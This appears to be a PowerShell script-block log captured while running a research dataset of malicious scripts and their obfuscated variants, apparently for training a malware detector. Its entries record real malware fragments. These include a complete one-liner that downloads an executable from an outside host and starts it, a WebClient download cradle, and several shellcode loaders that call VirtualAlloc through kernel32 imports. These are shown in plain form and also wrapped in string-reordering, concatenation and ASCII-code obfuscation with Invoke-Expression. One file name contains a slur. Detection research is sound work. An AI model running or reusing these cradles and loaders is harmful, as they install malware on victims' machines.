"8/6/2026 9:50:32 AM","","449","$wC=NeW-OBJEcT SYstem.NEt.WebCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeAdeRS.Add('User-Agent',$u);$wC.PROXY = [SYstEm.NET.WebREQuEST]::DEFaultWEbProxY;$wc."
"8/6/2026 9:50:31 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1208.ps1","1460",".( $VErBOSEprefEREnCE.TOSTring()[1,3]+'x'-JOIn'')( ((""{43}{10}{13}{40}{84}{87}{9}{60}{28}{76}{70}{68}{6}{35}{46}{71}{86}{18}{55}{31}{30}{54}{41}{90}{88}{11}{75}{51}{1}{34}{4}{66}{8}{15}{67}{79}{32}{39"
"8/6/2026 9:50:24 AM","","9","$global:?"
"8/6/2026 9:50:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:50:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:50:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:50:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:50:24 AM","","449","$wC=NeW-OBJEcT SYstem.NEt.WebCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeAdeRS.Add('User-Agent',$u);$wC.PROXY = [SYstEm.NET.WebREQuEST]::DEFaultWEbProxY;$wc."
"8/6/2026 9:50:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1208.ps1","1078"," ('H27wC=N'+'eW'+'-OBJEc'+'T S'+'Ystem'+'.NEt.WebCLiE'+'nT;H27u=9qJMozilla/5.'+'0 (Windows NT 6.'+'1'+'; WOW64;'+' Tr'+'i'+'dent/7.0; rv'+':11.0'+') li'+'ke '+'Ge'+'c'+'ko'+'9q'+'J'+';H27'+'w'+'C.HeA'"
"8/6/2026 9:50:16 AM","","9","$global:?"
"8/6/2026 9:50:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:50:16 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:50:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:50:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:50:16 AM","","451"," $wC=NeW-OBJEcT SYstem.NEt.WebCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeAdeRS.Add('User-Agent',$u);$wC.PROXY = [SYstEm.NET.WebREQuEST]::DEFaultWEbProxY;$wc"
"8/6/2026 9:50:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1208.ps1","19","{([chAR][inT] $_) }"
"8/6/2026 9:50:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1208.ps1","1649",""" $( Set-ITeM 'vAriabLe:OFs'  '' )"" +[stRIng]( '36_119%67_61N78<101<87<45z79a66z74u69C99%84a32_83~89a115%116<101<109<46N78z69C116!46%87z101!98<67C76_105~69!110a84<59u36_117N61u39!77~111%122a105u108~10"
"8/6/2026 9:50:09 AM","","9","$global:?"
"8/6/2026 9:50:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:50:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:50:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:50:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:50:08 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1208.ps1","449","$wC=NeW-OBJEcT SYstem.NEt.WebCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeAdeRS.Add('User-Agent',$u);$wC.PROXY = [SYstEm.NET.WebREQuEST]::DEFaultWEbProxY;$wc."
"8/6/2026 9:50:01 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:50:01 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:50:01 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:50:01 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:50:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1203.ps1","2238","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:49:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:49:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:49:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:49:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:49:52 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:49:52 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1203.ps1","2762","(((""{41}{24}{7}{40}{20}{30}{10}{21}{17}{23}{12}{28}{25}{22}{31}{45}{26}{44}{11}{29}{5}{18}{13}{43}{38}{15}{9}{27}{4}{6}{3}{33}{8}{19}{46}{14}{39}{16}{37}{42}{0}{1}{35}{2}{32}{34}{36}"" -f',0x36,0x6a,0x"
"8/6/2026 9:49:45 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:49:45 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:49:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:49:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:49:44 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:49:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1203.ps1","2644"," &( $shelLid[1]+$ShELliD[13]+'X')((('BGTc = LqX[DllImport(xTjkernel32.dllx'+'Tj)]public'+' static extern IntPtr Vir'+'tualAlloc(IntPtr lpAddress, uint dwSize, uint fl'+'AllocationType, uint flProtect)"
"8/6/2026 9:49:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:49:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:49:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:49:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:49:36 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:49:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1203.ps1","22","{( [Int] $_-AS[CHar])}"
"8/6/2026 9:49:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1203.ps1","7550"," iEx(-jOIn ( '36a99T32T61q32T39>91%68Y108j108>73>109{112j111I114q116j40j34j107I101%114%110e101{108j51>50>46{100{108{108Y34I41T93{112a117j98j108a105a99q32%115T116a97{116%105{99{32e101I120j116a101>114{1"
"8/6/2026 9:49:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:49:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:49:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:49:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:49:28 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1203.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:49:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:49:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:49:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:49:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:49:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1196.ps1","2287","$c = '
[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(""kernel32.dll"")]public static extern IntP"
"8/6/2026 9:49:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:49:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:49:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:49:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:49:12 AM","","2281","$c = '
[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(""kernel32.dll"")]public static extern IntP"
"8/6/2026 9:49:12 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1196.ps1","2860","((""{15}{1}{14}{16}{23}{30}{44}{24}{43}{33}{34}{21}{41}{42}{0}{8}{7}{35}{10}{45}{40}{17}{31}{4}{3}{32}{19}{5}{39}{46}{9}{26}{11}{27}{22}{25}{18}{20}{13}{36}{12}{2}{28}{6}{29}{37}{38}"" -f'Name QIGWin32Q"
"8/6/2026 9:49:04 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:49:04 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:49:04 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:49:04 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:49:04 AM","","2281","$c = '
[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(""kernel32.dll"")]public static extern IntP"
"8/6/2026 9:49:04 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1196.ps1","2690"," &((GeT-VArIAbLE '*mdR*').nAME[3,11,2]-jOiN'') ( (('tykc = vxQ
[DllImport(s'+'xhkernel32'+'.dllsxh)]public s'+'tatic extern IntPtr VirtualAlloc(IntPtr lpAdd'+'ress, '+'uint dwSize, uint flAllocationT"
"8/6/2026 9:48:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:48:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:48:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:48:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:48:56 AM","","2283"," $c = '
[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(""kernel32.dll"")]public static extern Int"
"8/6/2026 9:48:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1196.ps1","23","{ ([INT]$_ -As [CHar])}"
"8/6/2026 9:48:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1196.ps1","10031"," &( $enV:coMSPeC[4,24,25]-joiN'') (""$( Set-ITEm  'VaRiAbLE:oFs' '') ""+[strInG]((36,99, 32 ,61,32 , 39,13 , 10,91, 68,108,108 , 73, 109, 112, 111,114, 116,40, 34 ,107,101 , 114, 110,101,108,51 ,50, 46 "
"8/6/2026 9:48:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:48:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:48:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:48:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:48:48 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1196.ps1","2281","$c = '
[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(""kernel32.dll"")]public static extern IntP"
"8/6/2026 9:48:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:48:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:48:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:48:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:48:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1183.ps1","127","(NeW-O`B`jEct System.Net.WebClient).DownloadFile('http://worldnit.com/nigga.exe','fleeble.exe');STart-p`Roce`SS 'fleeble.exe'
"
"8/6/2026 9:48:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:48:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:48:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:48:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:48:32 AM","","121","(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/nigga.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 9:48:32 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1183.ps1","483"," ((""{13}{15}{19}{35}{11}{10}{0}{16}{6}{24}{27}{23}{1}{31}{26}{18}{4}{32}{3}{14}{30}{22}{2}{20}{34}{36}{9}{5}{25}{7}{21}{29}{33}{8}{17}{12}{28}"" -f'.Net','nloadFil','gg','worldn','tt','.e','We','mN','s"
"8/6/2026 9:48:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:48:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:48:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:48:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:48:24 AM","","121","(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/nigga.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 9:48:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1183.ps1","284","(('(Ne'+'w-Obj'+'ect System'+'.N'+'e'+'t.WebC'+'li'+'en'+'t).DownloadFil'+'e({0}h'+'ttp://w'+'orl'+'dnit.com'+'/'+'nigga'+'.exe{0},{0}f'+'lee'+'b'+'le.exe'+'{0'+'});St'+'a'+'rt-'+'Proce'+'ss '+'{0'+'}"
"8/6/2026 9:48:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:48:16 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:48:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:48:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:48:16 AM","","124","  (New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/nigga.exe','fleeble.exe');Start-Process 'fleeble.exe' "
"8/6/2026 9:48:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1183.ps1","23","{ ([int]$_-aS [cHar]) }"
"8/6/2026 9:48:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1183.ps1","696",""" $(SeT-ItEm  'VARiaBle:Ofs'  '' ) ""+ [string]('40K78W101K119i45-79%98>106-101X99i116%32v83-121v115X116X101v109%46K78i101X116K46-87%101X98-67v108v105>101W110P116K41-46P68K111%119W110-108%111K97X100X70"
"8/6/2026 9:48:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:48:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:48:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:48:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:48:08 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1183.ps1","121","(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/nigga.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 9:48:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:48:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:48:00 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:48:00 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:48:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1181.ps1","2223","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:47:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:47:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:47:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:47:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:47:52 AM","","2216","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:47:52 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1181.ps1","2888","(((""{0}{27}{50}{14}{6}{18}{24}{22}{28}{5}{20}{26}{41}{52}{38}{10}{37}{56}{54}{4}{49}{30}{57}{63}{67}{42}{8}{3}{17}{12}{47}{23}{16}{60}{31}{62}{9}{58}{1}{44}{7}{34}{40}{53}{51}{64}{43}{48}{45}{35}{2}{6"
"8/6/2026 9:47:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:47:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:47:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:47:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:47:44 AM","","2216","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:47:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1181.ps1","2569","(('p'+'YXc = lS2[DllImport(RuEkernel32.dllRuE)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImp'+'ort(RuEkern'+'el32.dllRuE)]publi"
"8/6/2026 9:47:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:47:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:47:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:47:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:47:36 AM","","2216","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:47:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1181.ps1","19","{([chAR] [int] $_)}"
"8/6/2026 9:47:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1181.ps1","9676","& ( $sHeLlid[1]+$sheLLID[13]+'x')(-JoIn ( ( 36 ,99,32, 61,32 , 39 ,91,68, 108,108, 73 ,109,112 ,111,114,116 ,40 ,34 ,107 ,101 ,114 ,110 , 101,108, 51,50 , 46, 100,108,108 , 34 ,41,93 ,112,117,98,108 ,"
"8/6/2026 9:47:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:47:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:47:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:47:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:47:27 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1181.ps1","2216","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:47:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:47:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:47:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:47:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:47:19 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1180.ps1","2251","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:47:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:47:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:47:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:47:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:47:11 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:47:11 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1180.ps1","2839"," ((""{26}{46}{2}{18}{40}{42}{17}{43}{37}{0}{38}{8}{36}{45}{25}{19}{12}{1}{24}{3}{29}{32}{9}{20}{5}{11}{13}{34}{22}{10}{31}{21}{44}{33}{27}{30}{6}{4}{7}{14}{35}{16}{28}{15}{23}{39}{41}""-f'in32','xe3,0x3"
"8/6/2026 9:47:04 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:47:04 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:47:04 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:47:04 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:47:03 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:47:03 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1180.ps1","2687","('ApPc = 3Xh[DllImport(9dlkernel32.dll9dl)]public static extern IntPtr VirtualAlloc(IntPtr lpAd'+'d'+'ress, uint'+' dwSize, uint flA'+'l'+'lo'+'cationType, uint flProte'+'ct'+');[DllImport('+'9dlkerne"
"8/6/2026 9:46:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:46:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:46:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:46:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:46:55 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:46:55 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1180.ps1","18","{([cHAr][INT] $_)}"
"8/6/2026 9:46:55 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1180.ps1","7638"," &((VArIabLe '*Mdr*').NaME[3,11,2]-Join'')(( '36k99k32>61>32J39p91G68D108J108J73L109D112q111>114k116L40>34p107D101G114J110k101D108>51D50b46p100{108{108J34G41D93b112b117>98k108L105>99G32q115D116q97b116"
"8/6/2026 9:46:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:46:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:46:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:46:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:46:47 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1180.ps1","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:46:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:46:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:46:39 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:46:39 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:46:39 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1178.ps1","2249","$eVT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:46:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:46:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:46:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:46:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:46:31 AM","","2244","$eVT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
